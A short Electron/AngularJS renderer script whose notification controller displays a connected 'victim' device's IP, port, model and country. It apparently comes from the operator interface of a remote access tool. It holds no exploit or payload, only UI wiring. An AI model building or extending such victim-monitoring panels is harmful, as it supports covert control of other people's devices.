const { remote } = require('electron');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', []);



var victim = remote.getCurrentWebContents().victim;


app.controller("NotifiCtrl", function($scope, $location) {
    $NotifiCtrl = $scope;

    $NotifiCtrl.victimSocket = victim.ip + ":" + victim.port;
    $NotifiCtrl.victimModel = victim.model;
    $NotifiCtrl.victimCountry = victim.country;






});